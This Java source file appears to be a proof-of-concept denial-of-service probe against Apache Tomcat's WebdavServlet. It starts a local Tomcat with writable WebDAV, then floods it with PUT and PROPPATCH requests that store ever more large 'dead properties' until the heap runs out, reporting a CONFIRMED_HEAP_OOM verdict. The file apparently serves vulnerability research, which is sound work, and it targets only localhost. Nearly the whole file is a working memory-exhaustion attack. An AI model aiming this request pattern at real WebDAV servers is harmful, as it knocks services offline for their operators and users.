package org.example.dos.dynamic;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Collection;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.servlets.WebdavServlet;
import org.apache.catalina.startup.Tomcat;

public final class TomcatWebdavDeadPropertiesHttpProbe {
    private static final class DeadPropertyStats {
        private final int paths;
        private final int names;

        private DeadPropertyStats(int paths, int names) {
            this.paths = paths;
            this.names = names;
        }
    }

    private static String xmlBody(String propertyName, int payloadBytes, int index) {
        String payload = ProbeSupport.uniquePayload(index, payloadBytes)
                .replace("&", "a")
                .replace("<", "b")
                .replace(">", "c");
        return "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n"
                + "<D:propertyupdate xmlns:D=\"DAV:\" xmlns:x=\"urn:dos\">\n"
                + "  <D:set><D:prop><x:" + propertyName + ">" + payload + "</x:" + propertyName + "></D:prop></D:set>\n"
                + "</D:propertyupdate>";
    }

    private static int put(int port, String path, int index) throws Exception {
        return ProbeSupport.http(
                "PUT",
                "http://127.0.0.1:" + port + path,
                Map.of("Content-Type", "text/plain"),
                ProbeSupport.uniquePayload(index, 32).getBytes(StandardCharsets.UTF_8));
    }

    private static int proppatch(int port, String path, String body) throws Exception {
        return ProbeSupport.http(
                "PROPPATCH",
                "http://127.0.0.1:" + port + path,
                Map.of("Content-Type", "application/xml"),
                body.getBytes(StandardCharsets.UTF_8));
    }

    @SuppressWarnings("unchecked")
    private static DeadPropertyStats deadPropertyStats(WebdavServlet servlet) throws Exception {
        Object store = ProbeSupport.field(servlet, WebdavServlet.class, "store");
        ConcurrentHashMap<String, ?> deadProperties =
                (ConcurrentHashMap<String, ?>) ProbeSupport.field(store, store.getClass(), "deadProperties");
        int names = 0;
        for (Object properties : deadProperties.values()) {
            if (properties instanceof Collection<?>) {
                names += ((Collection<?>) properties).size();
            }
        }
        return new DeadPropertyStats(deadProperties.size(), names);
    }

    public static void main(String[] args) throws Exception {
        int requests = Integer.parseInt(args[0]);
        int propertiesPerRequest = Integer.parseInt(args[1]);
        int payloadBytes = Integer.parseInt(args[2]);
        int progressEvery = Integer.parseInt(args[3]);
        int port = Integer.parseInt(args[4]);
        String profile = args[5];

        File base = new File("target/tomcat-webdav-dead-properties-" + port);
        File docBase = new File(base, "webroot");
        docBase.mkdirs();

        Tomcat tomcat = new Tomcat();
        tomcat.setBaseDir(base.getAbsolutePath());
        tomcat.setPort(port);
        tomcat.getConnector();

        Context context = tomcat.addContext("", docBase.getAbsolutePath());
        WebdavServlet servlet = new WebdavServlet();
        Wrapper wrapper = Tomcat.addServlet(context, "webdav", servlet);
        wrapper.addInitParameter("readonly", "false");
        wrapper.addInitParameter("listings", "true");
        wrapper.addInitParameter(
                "maxRequestBodySize",
                Integer.toString(Math.max(8192, propertiesPerRequest * payloadBytes * 2)));
        context.addServletMappingDecoded("/*", "webdav");

        AtomicInteger completedRequests = new AtomicInteger();
        ProbeSupport.installOomExitHandler(() -> {
            try {
                DeadPropertyStats stats = deadPropertyStats(servlet);
                System.out.println("requestsBeforeOom=" + completedRequests.get());
                System.out.println("deadPropertyPathsBeforeOom=" + stats.paths);
                System.out.println("deadPropertyNamesBeforeOom=" + stats.names);
            } catch (Exception ignored) {
                System.out.println("requestsBeforeOom=" + completedRequests.get());
                System.out.println("deadPropertyPathsBeforeOom=unknown");
                System.out.println("deadPropertyNamesBeforeOom=unknown");
            }
            System.out.println("oomSignal=uncaught_handler");
        });

        tomcat.start();
        ProbeSupport.printCommon("tomcat-webdav-dead-properties-real-http", requests, payloadBytes, port, profile);
        System.out.println("propertiesPerRequest=" + propertiesPerRequest);
        System.out.println("configuredMaxRequestBodySize=" + Math.max(8192, propertiesPerRequest * payloadBytes * 2));
        System.out.println("proppatchUsesReadRequestBodyLimit=false");
        System.out.flush();

        int i = 0;
        try {
            while (requests < 0 || i < requests) {
                String path = "/resource-" + i + ".txt";
                int putCode = put(port, path, i);
                if (putCode != 201 && putCode != 204) {
                    throw new IllegalStateException("PUT returned HTTP " + putCode);
                }
                for (int p = 0; p < propertiesPerRequest; p++) {
                    String propertyName = "p" + i + "_" + p;
                    int code = proppatch(port, path, xmlBody(propertyName, payloadBytes, i * propertiesPerRequest + p));
                    if (code < 200 || code >= 300) {
                        throw new IllegalStateException("PROPPATCH returned HTTP " + code);
                    }
                }
                i++;
                completedRequests.set(i);
                if (i % progressEvery == 0) {
                    DeadPropertyStats stats = deadPropertyStats(servlet);
                    System.out.println("progress requests=" + i
                            + " deadPropertyPaths=" + stats.paths
                            + " deadPropertyNames=" + stats.names
                            + " usedHeapBytes=" + ProbeSupport.usedHeapBytes());
                    System.out.flush();
                }
            }
            DeadPropertyStats stats = deadPropertyStats(servlet);
            System.out.println("verdict=COMPLETED");
            System.out.println("requestsCompleted=" + i);
            System.out.println("deadPropertyPaths=" + stats.paths);
            System.out.println("deadPropertyNames=" + stats.names);
        } catch (OutOfMemoryError oom) {
            DeadPropertyStats stats = deadPropertyStats(servlet);
            System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
            System.out.println("requestsBeforeOom=" + i);
            System.out.println("deadPropertyPathsBeforeOom=" + stats.paths);
            System.out.println("deadPropertyNamesBeforeOom=" + stats.names);
            System.out.println("oomSignal=main_thread");
            System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
            System.out.flush();
            System.exit(ProbeSupport.OOM_EXIT_CODE);
        } finally {
            tomcat.stop();
            tomcat.destroy();
        }
    }
}
